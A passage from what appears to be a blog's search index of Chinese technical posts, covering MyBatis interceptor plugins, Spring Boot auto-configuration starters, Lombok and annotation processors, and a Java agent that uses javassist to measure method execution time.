\u0026#34;query\u0026#34;, args = {MappedStatement.class, Object.class, RowBounds.class, ResultHandler.class} ) }) public class ExamplePlugin implements Interceptor { @Override public Object intercept(Invocation invocation) throws Throwable { System.out.println(\u0026#34;implement pre-processing if needed\u0026#34;); Object result = invocation.proceed(); System.out.printf(\u0026#34;result: %s\\n\u0026#34;, result); System.out.println(\u0026#34;implement post-processing if needed\u0026#34;); return result; } @Override public void setProperties(Properties properties) { System.out.printf(\u0026#34;properties: %s\\n\u0026#34;, properties); } } @Intercepts 必不可少，其中 @Signature 声明方法签名数组，上面这个简单的插件用于拦截 Executor 的参数类型列表为 (MappedStatement.class, Object.class, RowBounds.class, ResultHandler.class) 的 query 方法，在此方法调用前做预处理，在此方法调用后做后处理。\n拦截 Executor 的 query 方法是否真能对 Mapper 方法调用起作用？且让我们先在 mybatis-config.xml 中声明自定义插件：\n1 2 3 4 5 \u0026lt;plugins\u0026gt; \u0026lt;plugin interceptor=\u0026#34;io.h2cone.mybatis.interceptor.ExamplePlugin\u0026#34;\u0026gt; \u0026lt;property name=\u0026#34;someProperty\u0026#34; value=\u0026#34;1024\u0026#34;/\u0026gt; \u0026lt;/plugin\u0026gt; \u0026lt;/plugins\u0026gt; 准备一个简单的 Mapper，模拟通过省区代码查询城市列表：\n1 2 3 4 5 6 public interface CityMapper { @Select(\u0026#34;select * from city where province_code = #{provinceCode}\u0026#34;) List\u0026lt;City\u0026gt; selectCities(String provinceCode); } 编写用例测试一下我们的插件：\n1 2 3 4 5 6 7 8 9 10 11 12 @Test public void testExamplePlugin() throws IOException { String resource = \u0026#34;mybatis-config.xml\u0026#34;; InputStream inputStream = Resources.getResourceAsStream(resource); SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(inputStream); try (SqlSession session = sqlSessionFactory.openSession()) { CityMapper mapper = session.getMapper(CityMapper.class); List\u0026lt;City\u0026gt; cities = mapper.selectCities(\u0026#34;000000\u0026#34;); Assert.assertNotNull(cities); } } 运行测试代码输出如下：\n1 2 3 4 properties: {someProperty=1024} implement pre-processing if needed result: [] implement post-processing if needed 可见我们的预处理和后处理成功插入了 Mapper 方法调用之前和之后，完整代码请看 mybatis-interceptor。\n知其所以然 MyBatis 如何实现插件？瞧瞧 MyBatis 源码也许能找到答案。先从 testExamplePlugin 这个测试方法开始，从表面上看，分成几步：\n加载 XML 配置文件\n从 XML 构建 SqlSessionFactory\n使用 SqlSessionFactory 打开 SqlSession\n查询数据库\n解析 XML 配置后加载插件是否发生在第二步？层层探索源码之后，留下了一些蛛丝马迹：\norg.apache.ibatis.session.SqlSessionFactoryBuilder#build(java.io.InputStream)\norg.apache.ibatis.session.SqlSessionFactoryBuilder#build(java.io.InputStream, java.lang.String, java.util.Properties)\norg.apache.ibatis.builder.xml.XMLConfigBuilder#XMLConfigBuilder(java.io.InputStream, java.lang.String, java.util.Properties)\norg.apache.ibatis.builder.xml.XMLConfigBuilder#XMLConfigBuilder(org.apache.ibatis.parsing.XPathParser, java.lang.String, java.util.Properties)\norg.apache.ibatis.builder.xml.XMLConfigBuilder#parse\norg.apache.ibatis.builder.xml.XMLConfigBuilder#parseConfiguration\norg.apache.ibatis.builder.xml.XMLConfigBuilder#pluginElement\norg.apache.ibatis.session.Configuration#addInterceptor\norg.apache.ibatis.plugin.InterceptorChain#addInterceptor\norg.apache.ibatis.plugin.InterceptorChain#addInterceptor\n由此看来，自定义插件会添加到 org.apache.ibatis.plugin.InterceptorChain#interceptors：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 public class InterceptorChain { private final List\u0026lt;Interceptor\u0026gt; interceptors = new ArrayList\u0026lt;\u0026gt;(); public Object pluginAll(Object target) { for (Interceptor interceptor : interceptors) { target = interceptor.plugin(target); } return target; } public void addInterceptor(Interceptor interceptor) { interceptors.add(interceptor); } public List\u0026lt;Interceptor\u0026gt; getInterceptors() { return Collections.unmodifiableList(interceptors); } } 这种设计是 Chain-of-responsibility pattern。注意 pluginAll 方法，终于还是回到了 Interceptor:\n1 2 3 4 5 6 7 8 9 10 11 12 13 public interface Interceptor { Object intercept(Invocation invocation) throws Throwable; default Object plugin(Object target) { return Plugin.wrap(target, this); } default void setProperties(Properties properties) { // NOP } } 注意 plugin 方法，再点开 org.apache.ibatis.plugin.Plugin#wrap 方法，果然 MyBatis 插件基于 JDK 动态代理来实现：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 public class Plugin implements InvocationHandler { private final Object target; private final Interceptor interceptor; private final Map\u0026lt;Class\u0026lt;?\u0026gt;, Set\u0026lt;Method\u0026gt;\u0026gt; signatureMap; private Plugin(Object target, Interceptor interceptor, Map\u0026lt;Class\u0026lt;?\u0026gt;, Set\u0026lt;Method\u0026gt;\u0026gt; signatureMap) { this.target = target; this.interceptor = interceptor; this.signatureMap = signatureMap; } public static Object wrap(Object target, Interceptor interceptor) { Map\u0026lt;Class\u0026lt;?\u0026gt;, Set\u0026lt;Method\u0026gt;\u0026gt; signatureMap = getSignatureMap(interceptor); Class\u0026lt;?\u0026gt; type = target.getClass(); Class\u0026lt;?\u0026gt;[] interfaces = getAllInterfaces(type, signatureMap); if (interfaces.length \u0026gt; 0) { return Proxy.newProxyInstance( type.getClassLoader(), interfaces, new Plugin(target, interceptor, signatureMap)); } return target; } @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { try { Set\u0026lt;Method\u0026gt; methods = signatureMap.get(method.getDeclaringClass()); if (methods != null \u0026amp;\u0026amp; methods.contains(method)) { return interceptor.intercept(new Invocation(target, method, args)); } return method.invoke(target, args); } catch (Exception e) { throw ExceptionUtil.unwrapThrowable(e); } } ... 如代码所说，把插件要拦截的方法所属的类的实例当作被代理（target），满足条件时生成了代理（proxy）。举例来说，Executor 接口的实现类都是被代理类，它们对应的代理类都实现了 Executor，一旦 Executor 的实现类的方法被调用时，偷天换日，实际调用的则是 org.apache.ibatis.plugin.Plugin#invoke 方法，其中调用了 ExamplePlugin 重写的intercept 方法，因此，我们才能在 Executor 实现类方法调用前后插入预处理和后处理。\n那么，org.apache.ibatis.plugin.InterceptorChain#pluginAll 方法什么时候被调用？继续深入测试代码第三步的源代码：\norg.apache.ibatis.session.SqlSessionFactory#openSession()\norg.apache.ibatis.session.defaults.DefaultSqlSessionFactory#openSession()\norg.apache.ibatis.session.defaults.DefaultSqlSessionFactory#openSessionFromDataSource\norg.apache.ibatis.session.Configuration#newExecutor(org.apache.ibatis.transaction.Transaction, org.apache.ibatis.session.ExecutorType)\norg.apache.ibatis.plugin.InterceptorChain#pluginAll\n当然，我们也可以利用 IntelliJ IDEA CE 的代码分析功能，查一下哪里使用了 pluginAll 方法：\n从终点出发，回到了起点。\n尾声 大胆猜想一下，分页插件是通过拦截 StatementHandler 的 query 等方法，取得 SQL，改写 SQL 使其能够分页、求总记录数、排序。除了分页，MyBatis 插件理所当然可以做慢 SQL 监控、水平分表、数据加密和解密、菜单权限控制\u0026hellip;\u0026hellip;\n本文首发于 https://h2cone.github.io\n参考资料 MyBatis: plug-ins\nMybatis之plugin插件设计原理\nMyBatis插件原理\nMyBatis: getting started\nMybatisAutoConfigurationTest\nI can not config my interceptors in application.yml\nplugins-package option for application.yml\nPlug-in (computing)\n","date":"2020-02-08T18:28:19+08:00","permalink":"https://h2cone.github.io/2020/02/08/your-own-mybatis-interceptor/","title":"造你自己的 MyBatis 插件"},{"content":"自动配置 遥想以前，Spring 集成其它模块往往需要大量的 XML 配置和 Java 配置，经历过 SSM（Spring、Spring MVC、MyBatis）或者 SSH（Struts、Spring、Hibernate）框架搭建和填空的人们应该深有体会，特别费时费力，直到 Spring Boot 的流行才有所改善。\nSpring Boot 简化配置，开箱即用，得益于自动配置（auto-configuration）。开启了自动配置的 Spring Boot 程序会尝试猜测和配置我们可能需要的 Bean。如果我们给一般的 Spring Boot Web 程序（添加了 spring-boot-starter-web 依赖的 Spring Boot 程序）关联的 application.yml 文件增加一行：\n1 debug: true 程序启动成功后，可以在控制台观察到一段叫做 CONDITIONS EVALUATION REPORT 的冗长日志，下面截取若干部分：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 ============================ CONDITIONS EVALUATION REPORT ============================ Positive matches: ----------------- ... EmbeddedWebServerFactoryCustomizerAutoConfiguration.TomcatWebServerFactoryCustomizerConfiguration matched: - @ConditionalOnClass found required classes \u0026#39;org.apache.catalina.startup.Tomcat\u0026#39;, \u0026#39;org.apache.coyote.UpgradeProtocol\u0026#39; (OnClassCondition) ... Negative matches: ----------------- ... EmbeddedWebServerFactoryCustomizerAutoConfiguration.JettyWebServerFactoryCustomizerConfiguration: Did not match: - @ConditionalOnClass did not find required classes \u0026#39;org.eclipse.jetty.server.Server\u0026#39;, \u0026#39;org.eclipse.jetty.util.Loader\u0026#39;, \u0026#39;org.eclipse.jetty.webapp.WebAppContext\u0026#39; (OnClassCondition) EmbeddedWebServerFactoryCustomizerAutoConfiguration.NettyWebServerFactoryCustomizerConfiguration: Did not match: - @ConditionalOnClass did not find required class \u0026#39;reactor.netty.http.server.HttpServer\u0026#39; (OnClassCondition) EmbeddedWebServerFactoryCustomizerAutoConfiguration.UndertowWebServerFactoryCustomizerConfiguration: Did not match: - @ConditionalOnClass did not find required classes \u0026#39;io.undertow.Undertow\u0026#39;, \u0026#39;org.xnio.SslClientAuthMode\u0026#39; (OnClassCondition) ... Exclusions: ----------- None Unconditional classes: ---------------------- org.springframework.boot.autoconfigure.context.ConfigurationPropertiesAutoConfiguration org.springframework.boot.actuate.autoconfigure.info.InfoContributorAutoConfiguration ... 这份报告分为四个部分：Positive matches、Negative matches、Exclusions、Unconditional classes，顾名思义，对于这个程序内嵌的应用服务器，只有 Tomcat 的配置类是匹配的，而 Jetty、Undertow、Netty 的配置类均不匹配，它们共同的外部类则是一个自动配置类：EmbeddedWebServerFactoryCustomizerAutoConfiguration，这就是 Spring Boot 提供的内嵌应用服务器的自动配置。\n自动配置类满足一些条件时，即匹配，框架就自动进行了配置，例如，如果你在 classpath 上有 tomcat-embedded.jar，你可能想要一个 TomcatServletWebServerFactory bean，除非你定义了自己的 ServletWebServerFactory bean。\n不出意外，Spring Web 模块需要配置的 Dispatcher Servlet、数据库操作需要配置的数据源等等，Spring Boot 都提供了基础的配置（参见 Spring Boot 源码的 spring.factories 文件），通常，用户只需要添加对应的依赖，简单声明一下，开箱即用，即使默认配置不满足后期需求，也支持覆盖或重写。\n自定义吧 自动配置是通过使用 @Configuration 注解的类来实现，其它诸如 @Conditional 的注解用于约束何时应用自动配置（是否匹配）。比如下面这个自定义的自动配置类：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 @ConditionalOnProperty(prefix = \u0026#34;springfox-swagger2\u0026#34;, name = \u0026#34;enabled\u0026#34;) @Configuration @EnableSwagger2 @EnableConfigurationProperties(SpringFoxSwagger2Prop.class) public class SpringFoxSwagger2AutoConfig { @Resource private SpringFoxSwagger2Prop springFoxSwagger2Prop; @Bean @ConditionalOnMissingBean public Docket docket() { ApiSelectorBuilder builder = new Docket(DocumentationType.SWAGGER_2) .apiInfo(apiInfo()) .select(); List\u0026lt;String\u0026gt; excludedPaths = springFoxSwagger2Prop.getExcludedPaths(); if (excludedPaths == null || excludedPaths.isEmpty()) { builder.paths(Predicates.not(PathSelectors.regex(\u0026#34;/error\u0026#34;))) .paths(Predicates.not(PathSelectors.regex(\u0026#34;/actuator.*\u0026#34;))); } else { for (String path : excludedPaths) { builder.paths(Predicates.not(PathSelectors.regex(path))); } } return builder.build(); } private ApiInfo apiInfo() { SpringFoxSwagger2Prop.ApiInfo apiInfo = springFoxSwagger2Prop.getApiInfo(); if (apiInfo == null) { return ApiInfo.DEFAULT; } SpringFoxSwagger2Prop.Contact contact = apiInfo.getContact(); return new ApiInfo( apiInfo.getTitle(), apiInfo.getDescription(), apiInfo.getVersion(), apiInfo.getTermsOfServiceUrl(), new Contact(contact.getName(), contact.getUrl(), contact.getEmail()), apiInfo.getLicense(), apiInfo.getLicenseUrl(), Collections.emptyList() ); } } SpringFoxSwagger2AutoConfig 的目的是创建 Docket 实例并交由 Spring IoC 容器管理，为了能够让 Spring Boot 采用这个自动配置类，应当在 springfox-swagger2-spring-boot-autoconfigure/src/main/resources/META-INF/spring.factories 文件里声明：\n1 2 org.springframework.boot.autoconfigure.EnableAutoConfiguration=\\ io.h2cone.springfox.swagger2.spring.boot.autoconfigure.SpringFoxSwagger2AutoConfig 若有多个，则用逗号隔开，若需换行，则用反斜杠。值得注意的是，官方文档有一个小提示：\nAuto-configurations must be loaded that way only. Make sure that they are defined in a specific package space and that they are never the target of component scanning. Furthermore, auto-configuration classes should not enable component scanning to find additional components. Specific @Imports should be used instead.\n特别是第三句，自动配置类不应启用组件扫描以查找其他组件，比如 @ComponentScan，应该使用指定的 @Imports 代替。一般情况下，自动配置类只能间接启用组件扫描，在自动配置类上声明导入了一些配置类（@Configuration），利用这些配置类可以启动组件扫描，查找标注了 @Component、@Controller、@Repository、@Service、@Aspect 等注解的类，除非，自定义注解、扫描、处理。\n以上代码来源于 springfox-swagger2-spring-boot，其中有如下三个模块:\nspringfox-swagger2-spring-boot-autoconfigure springfox-swagger2-spring-boot-starter springfox-swagger2-spring-boot-sample 职责分别是自动配置、包装、示例。利用 Spring Boot 的自动配置特性，我们还可以提前创建好一组复杂单例，注册为 Spring Bean，通过 YML 配置和依赖注入来使用\u0026hellip;\u0026hellip;\n走马观花 以上经验告诉我们，Spring Boot 启动时会读取 META-INF/spring.factories 的元数据，加载类，进行自动配置。那我们就能通过 IntelliJ IDEA CE 强大的搜索功能发现加载此文件的类：\n进去阅读一下 org.springframework.core.io.support.SpringFactoriesLoader 的源码和 Javadoc，再利用 IntelliJ IDEA CE 代码分析能力得知 loadFactories 和 loadFactoryNames 这两个公共方法被 org.springframework.boot.autoconfigure.AutoConfigurationImportSelector 使用了。再来看看 AutoConfigurationImportSelector 的简介：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 /** * {@link DeferredImportSelector} to handle {@link EnableAutoConfiguration * auto-configuration}. This class can also be subclassed if a custom variant of * {@link EnableAutoConfiguration @EnableAutoConfiguration} is needed. * * @author Phillip Webb * @author Andy Wilkinson * @author Stephane Nicoll * @author Madhura Bhave * @since 1.3.0 * @see EnableAutoConfiguration */ public class AutoConfigurationImportSelector implements DeferredImportSelector, BeanClassLoaderAware, ResourceLoaderAware, BeanFactoryAware, EnvironmentAware, Ordered { 原来是处理 @EnableAutoConfiguration 注解的类。我想有人曾经对一般的 Spring Boot 程序的入口感到好奇：\n1 2 3 4 5 6 7 8 @SpringBootApplication public class SampleApplication { public static void main(String[] args) { SpringApplication.run(SampleApplication.class, args); } } 瞄了一下 @SpringBootApplication：\n1 2 3 4 5 6 7 8 9 @Target(ElementType.TYPE) @Retention(RetentionPolicy.RUNTIME) @Documented @Inherited @SpringBootConfiguration @EnableAutoConfiguration @ComponentScan(excludeFilters = { @Filter(type = FilterType.CUSTOM, classes = TypeExcludeFilter.class), @Filter(type = FilterType.CUSTOM, classes = AutoConfigurationExcludeFilter.class) }) public @interface SpringBootApplication { 当然，开启了自动配置。\n本文首发于 https://h2cone.github.io\n推荐阅读 Creating Your Own Auto-configuration\nspring-boot-master-auto-configuration\nmybatis/spring-boot-starter\ndubbo-spring-boot-autoconfigure\ngrpc-spring-boot-starter\n","date":"2020-01-23T20:16:58+08:00","permalink":"https://h2cone.github.io/2020/01/23/your-own-spring-boot-starter/","title":"造你自己的 Spring Boot Starter 组件"},{"content":"为什么使用 Getter/Setter Java 的啰嗦和冗余是闻名于世的，特别在开发基于 Java 的业务系统的时候，继续不断地编写普通的 Java 类（数据类型），不假思索地用 private 修饰成员变量，熟练运用编辑器或集成开发环境不停地生成 Getter、Setter、ToString、Constructor 等方法。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 public class Member { public static final Logger log = LoggerFactory.getLogger(Member.class); private Long id; private String name; public Long getId() { return id; } public void setId(Long id) { this.id = id; } public String getName() { return name; } public void setName(String name) { this.name = name; } @Override public String toString() { return new StringJoiner(\u0026#34;, \u0026#34;, Member.class.getSimpleName() + \u0026#34;[\u0026#34;, \u0026#34;]\u0026#34;) .add(\u0026#34;id=\u0026#34; + id) .add(\u0026#34;name=\u0026#39;\u0026#34; + name + \u0026#34;\u0026#39;\u0026#34;) .toString(); } } 如果被问到为什么怎么做，便美名其曰“面向对象编程”（不管重复多少遍，我都想回到过去抗议不翻译成对象导向编程的人）；为了诠释什么是 Java 对象，于是把对象三大特征给搬了出来：状态、标识、行为。\n特征 解释 状态 数据类型的值 标识 内存地址 行为 数据类型的操作 再结合“面向对象编程”的三大特征：继承、多态、封装，特别指出封装（理直气壮，好像函数式编程不能封装似的），高谈阔论封装的好处，比如分离数据结构与其操作，提供 API，对使用者隐藏实现细节、隐藏数据的内部表示，非常利于维护、重用、单元测试，还不忘拾人牙慧，复读 David Wheeler 的话：\nAll problems in computer science can be solved by another level of indirection.\n计算机科学领域的任何问题都可以通过增加一个中间层来解决，Getter 和 Setter 就是封装形成的中间层（私有变量不能直接访问，只能通过中间层访问，不过该中间层往往非常浅薄），最后甩来一个链接：why-use-getters-and-setters-accessors。\nProject Lombok 用 private 修饰的字段和其 Getter/Settter 方法，既然已经成为约定俗成（若改用 public 修饰字段，可能成为”异类“），又或者这是库或框架的要求（我们不显式调用的方法，它们却很有可能需要隐式调用才能正常工作），或许还有其它理由，Java 程序员们需要不厌其烦去手动编写或静态生成那些刻板又繁多的代码，还好他们有化繁为简的神器，名为 Project Lombok：\nProject Lombok is a java library that automatically plugs into your editor and build tools, spicing up your java. Never write another getter or equals method again, with one annotation your class has a fully featured builder, Automate your logging variables, and much more.\n若用 Lombok 简化前面的代码：\n1 2 3 4 5 6 7 8 9 10 @Slf4j @Getter @Setter @Accessors(chain = true) @ToString public class Member { private Long id; private String name; } 特地用 @Accessors(chain = true) 进行了增强，允许链式调用 Setter 方法创建对象（因为每次都返回 this）：\n1 2 3 Member member = new Member() .setId(0L) .setName(\u0026#34;lombok\u0026#34;); 创建一个复杂对象，主流的做法是使用建造者模式（Builder Pattern），只需要一个 @Builder 注解到类上，更多特色的注解在这里可以找到。\n注解 （Annotation）并不神奇，它们只是只读的元数据，程序读取它们，按我们的声明进行处理，我们可以偷看一下 @Slf4j 这个注解的类：\n1 2 3 4 5 @Retention(RetentionPolicy.SOURCE) @Target(ElementType.TYPE) public @interface Slf4j { String topic() default \u0026#34;\u0026#34;; } @Retention 是一个元注解（注解的注解），其唯一属性的类型是 RetentionPolicy, 这个枚举只有三个：SOURCE、CLASS、RUNTIME，分别表示注解只保留到源文件，还是只保留到类文件，抑或是保留到运行时。由此可见，Lombok 的特色注解只保留到源文件，那么 Lombok 不是在运行时生成代码，而是在编译时生成代码（进一步证实是反编译有 Lombok 特色注解的源文件编译后的类文件）。\nAnnotation Processor 早在 Java 6 时期，开发人员就可以使用 Pluggable Annotation Processing API（JSR 269）定制注解处理器（Annotation Processor），处理源文件中的注解。比如，检查代码并发出自定义的错误或警告，就像 Java 编译器编译 Java 源文件时，它就会检查被 @Override 修饰的方法是否与父类或接口的方法签名相同，如果不同，就会报错（编译失败），又或者像 Lombok 那样，根据注解提供的信息在编译时更改代码（更改抽象语法树），而不会有运行时更改代码的开销。\n下面展示一个简单的注解处理器：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 @SupportedAnnotationTypes({ \u0026#34;io.h2cone.annotation.processor.Inspect\u0026#34; }) @SupportedSourceVersion(SourceVersion.RELEASE_8) public class SimpleAnnotationProcessor extends AbstractProcessor { @Override public boolean process(Set\u0026lt;? extends TypeElement\u0026gt; annotations, RoundEnvironment roundEnv) { for (TypeElement element : annotations) { this.processingEnv.getMessager().printMessage(Diagnostic.Kind.NOTE, element.getQualifiedName()); System.out.println(element.getQualifiedName()); } return false; } } 关键在于定制的注解处理器类需要继承 AbstractProcessor 类，并重写感兴趣的方法，去处理特定的注解，例如我们指定了一个自定义注解：\n1 2 3 4 5 6 7 8 9 10 @Retention(RetentionPolicy.SOURCE) @Target({ ElementType.TYPE, ElementType.METHOD }) public @interface Inspect { boolean ignore() default false; } 预期 process 方法会在编译时被调用，输出或打印传递而来的自定义注解的名称。可是其它项目如何使用定制的注解处理器？如果定制的注解处理器项目为 annotation-processor，那么它还需要一个文件（src/main/resources/META-INF/services/javax.annotation.processing.Processor）用来告诉编译器定制的注解处理器类在哪里：\n1 io.h2cone.annotation.processor.SimpleAnnotationProcessor 除此之外，构建此项目时应当添加编译参数 -proc:none，意味着无需注解处理即可进行编译（以 Maven 为例）：\n1 2 3 4 5 6 7 8 9 10 11 \u0026lt;build\u0026gt; \u0026lt;plugins\u0026gt; \u0026lt;plugin\u0026gt; \u0026lt;groupId\u0026gt;org.apache.maven.plugins\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;maven-compiler-plugin\u0026lt;/artifactId\u0026gt; \u0026lt;configuration\u0026gt; \u0026lt;compilerArgument\u0026gt;-proc:none\u0026lt;/compilerArgument\u0026gt; \u0026lt;/configuration\u0026gt; \u0026lt;/plugin\u0026gt; \u0026lt;/plugins\u0026gt; \u0026lt;/build\u0026gt; 否者会编译失败，得到一个错误（error: Bad service configuration file）。\n假设准备使用定制的注解处理器的项目为 annotation-processor-demo，那么它只需添加依赖：\n1 2 3 4 5 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;io.h2cone\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;annotation-processor\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;${project.version}\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 此依赖还包含了上面说到的自定义注解：\n1 2 3 @Inspect(ignore = true) public class Foobar { } 若使用 IntelliJ IDEA，依次点击 Build \u0026gt; Rebuild Project，成功后可以在底部的 Messages 看到 process 方法被调用从而输出了 Inspect 注解的名称：\n1 Information:java: io.h2cone.annotation.processor.Inspect 本文首发于 https://h2cone.github.io\n参考资料 Java开发神器Lombok的使用与原理\nOpen JDK # Compilation Overview\n【Lombok原理1】自定义注解处理器\nJava Pluggable Annotation Processor\n","date":"2019-11-30T23:43:35+08:00","permalink":"https://h2cone.github.io/2019/11/30/annotation-processor/","title":"注解处理器"},{"content":"序言 什么情况下应该探测或追踪程序？应用程序无不例外可能存在运行时才暴露的 bug，生产环境的故障排除，不得不依靠读日志和 Review 代码，运气好的话也许只看异常栈和关键代码就能快速提出假设，在本地验证通过，修复后发布上线，最后还可能对先前测试不充分感到羞愧。很不幸，如果是底层或性能的疑难杂症，CPU、内存、I/O、进程、线程、堆、栈等都可能提供线索，它们在程序运行过程中动态变化，只有探测或追踪它们才能超越表面的代码观察，从而搜集下层行为数据以供分析，参与 debug 的程序员则如虎添翼。在 Java 平台，BTrace 非常适合动态追踪正在运行的程序，它的基础正是 Java Instrumention 和 Java Attach API。\nInstrument 简介 Oracle JDK 里有一个名为 java.lang.instrument 的包：\nProvides services that allow Java programming language agents to instrument programs running on the JVM. The mechanism for instrumentation is modification of the byte-codes of methods. [0]\n从它的简介，我们可以确认的是 instrumentation 的机制是更改 Java 字节码，而且我们已经知道类文件包含字节码。不过等等，instrumentation 和 instrument 都是什么意思？在这里的 instrument，我暂时还找不到恰到好处的汉译，作动词时意为“给\u0026hellip;\u0026hellip;装测量仪器”或者“仪器化”，结合简介，此包允许 Java agent 给运行在 JVM 上的程序装测量仪器。Java agent 又是什么？它可以作为 Java 程序的探针，它本质上是一个 Jar 文件，它利用 Instrumentation 来更改已加载到 JVM 的类，例如往原类插入用于探测或追踪的代码，即所谓的埋点，它的底层实现依赖于 JVMTI (Java Virtual Machine Tool Interface)。\nIn the context of computer programming, instrumentation refers to an ability to monitor or measure the level of a product\u0026rsquo;s performance, to diagnose errors, and to write trace information. [1]\n上面这一段是 instrumentation 在维基百科的定义，instrumentation 是一种监控或测量应用程序性能，诊断错误以及写入跟踪信息的能力，此包当中的 java.lang.instrument.Instrumentation 接口，亦是如此：\nThis class provides services needed to instrument Java programming language code. Instrumentation is the addition of byte-codes to methods for the purpose of gathering data to be utilized by tools. Since the changes are purely additive, these tools do not modify application state or behavior. Examples of such benign tools include monitoring agents, profilers, coverage analyzers, and event loggers. [2]\n它被监控代理，分析器，覆盖率分析仪，事件记录器等工具所使用，诸如 jvisualvm、JProfiler、Arthas 等，这些工具通常不会改变目标程序的状态或行为。\n体验 如何以非侵入式测量 Java 方法执行耗时？你可能立马想到了操作字节码的库或框架，比如 JDK 动态代理、cglib、ASM、javassist、byte-buddy\u0026hellip;\u0026hellip;通过操作字节码在方法或代码块执行前后插入计时代码，但却极有可能需要手动更改原来的程序代码，例如添加依赖项以及新增切面类等等，既然如此，那就请 Java agent 帮忙吧。\n假设有一个 Cat 类，它有一些耗时方法，如下：\n1 2 3 4 5 6 7 public class Cat { public static void run() throws InterruptedException { System.out.println(\u0026#34;Cat is running\u0026#34;); Thread.sleep(RandomUtils.nextLong(3, 7)); } } 现在要利用 Java agent 测量 run 方法的执行时间，则需先构建 Java agent，因为它是 Jar 文件，要对被探测或追踪的程序起作用必然要先加载到 JVM，有两种方式，一是在 JVM 启动时通过命令行接口开启 agent；二是 JVM 启动后通过 Java Attach API 把 agent 附加到 JVM。\n首先以第一种方式来考虑 agent 类：\n1 2 3 4 5 6 public class ElapsedTimeAgent { public static void premain(String agentArgs, Instrumentation inst) { inst.addTransformer(new ElapsedTimeTransformer(agentArgs)); } } 此类实现了一个 premain 方法，它与我们常见的 main 方法相似，不仅都是作为执行的入口点，而且第一个方法参数的值来源于命令行，不过参数类型是字符串而不是字符串数组，命令行参数的解析交由用户实现；第二个参数类型是 Instrumentation，有两种获得其实例的方式：\n当以指定了 Java agent 的方式启动 JVM，Instrumentation 实例将传递给 agent 类的 premain 方法。\n当 Java agent 附加到启动后的 JVM，Instrumentation 实例将传递到 agent 类的 agentmain 方法。\n这两种方式与加载 Java agent 的方式一一对应。Instrumentation 的 addTransformer 方法用于注册已提供的 transformer：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 public class ElapsedTimeTransformer implements ClassFileTransformer { private String agentArgs; public ElapsedTimeTransformer() { } public ElapsedTimeTransformer(String agentArgs) { this.agentArgs = agentArgs; } @Override public byte[] transform(ClassLoader loader, String className, Class\u0026lt;?\u0026gt; classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException { byte[] bytecode = classfileBuffer; if (className.equals(agentArgs)) { ClassPool classPool = ClassPool.getDefault(); try { CtClass ctClass = classPool.makeClass(new ByteArrayInputStream(classfileBuffer)); CtMethod[] methods = ctClass.getDeclaredMethods(); for (CtMethod method : methods) { method.addLocalVariable(\u0026#34;begin\u0026#34;, CtClass.longType); method.addLocalVariable(\u0026#34;end\u0026#34;, CtClass.longType); method.insertBefore(\u0026#34;begin = System.nanoTime();\u0026#34;); method.insertAfter(\u0026#34;end = System.nanoTime();\u0026#34;); String methodName = method.getLongName(); String x = \u0026#34;System.out.println(\\\u0026#34;\u0026#34; + methodName + \u0026#34;\\\u0026#34; + \\\u0026#34;: \\\u0026#34; + (end - begin) + \\\u0026#34; ns\\\u0026#34;\u0026#34; + \u0026#34;);\u0026#34;; method.insertAfter(x); } bytecode = ctClass.toBytecode(); ctClass.detach(); } catch (IOException | CannotCompileException e) { e.printStackTrace(); } } return bytecode; } } 重写 transform 方法允许我们用更改后的类代替原类并加载。具体实现是使用 javassist 的 API 去更改已加载类的字节码，在类方法体的开头和结尾分别插入获取当前的纳秒级时间戳语句，并在最后插入计算结果的打印语句，新类的字节码作为 transform 方法的返回值。transform 方法什么时候被调用？每一个新类被类加载器加载时。\n其次，新建 MANIFEST.MF 文件编写一些键值对告诉 JVM 这个 agent 类在哪里以及是否允许重定义类或重转换类：\n1 2 3 4 Manifest-Version: 1.0 Premain-Class: io.h2cone.trace.agent.ElapsedTimeAgent Can-Redefine-Classes: true Can-Retransform-Classes: true 再次，利用 Maven 插件构建 agent jar 文件：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;plugin\u0026gt; \u0026lt;groupId\u0026gt;org.apache.maven.plugins\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;maven-assembly-plugin\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.1.1\u0026lt;/version\u0026gt; \u0026lt;executions\u0026gt; \u0026lt;execution\u0026gt; \u0026lt;phase\u0026gt;package\u0026lt;/phase\u0026gt; \u0026lt;goals\u0026gt; \u0026lt;goal\u0026gt;single\u0026lt;/goal\u0026gt; \u0026lt;/goals\u0026gt; \u0026lt;configuration\u0026gt; \u0026lt;finalName\u0026gt;agent\u0026lt;/finalName\u0026gt; \u0026lt;archive\u0026gt; \u0026lt;manifestFile\u0026gt;src/main/resources/META-INF/MANIFEST.MF\u0026lt;/manifestFile\u0026gt; \u0026lt;/archive\u0026gt; \u0026lt;descriptorRefs\u0026gt; \u0026lt;descriptorRef\u0026gt;jar-with-dependencies\u0026lt;/descriptorRef\u0026gt; \u0026lt;/descriptorRefs\u0026gt; \u0026lt;/configuration\u0026gt; \u0026lt;/execution\u0026gt; 